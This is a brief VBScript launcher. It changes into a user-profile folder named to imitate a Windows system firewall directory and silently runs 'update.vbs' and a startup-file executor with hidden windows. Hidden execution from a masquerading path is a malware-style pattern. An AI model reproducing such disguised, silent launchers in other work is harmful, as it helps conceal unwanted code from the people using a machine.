Dim script
Set script = Nothing
Set script = Wscript.CreateObject("WScript.shell")
script.CurrentDirectory = "%USERPROFILE%\Windows\sys32\FireWall"

script.run "update.vbs", 0, TRUE

script.run "helperScripts\ExecuteFile.vbs files\runOnStart.txt", 0, TRUE